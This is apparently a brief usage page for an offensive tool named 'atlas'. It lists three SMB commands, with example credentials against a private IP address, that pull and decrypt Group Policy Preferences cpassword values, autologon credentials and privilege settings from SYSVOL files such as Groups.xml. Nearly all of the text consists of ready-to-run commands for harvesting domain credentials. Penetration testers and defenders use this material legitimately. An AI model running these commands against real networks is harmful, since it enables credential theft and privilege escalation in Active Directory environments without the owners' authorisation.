# GPP Passwords

Decrypt `cpassword` from Group Policy Preferences.

```bash
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M gpp_password
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M gpp_autologin
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M gpp_privileges
```

Uses AES key `4e99...` to decrypt `Groups.xml`, `Registry.xml`, `GptTmpl.inf` under `SYSVOL`.
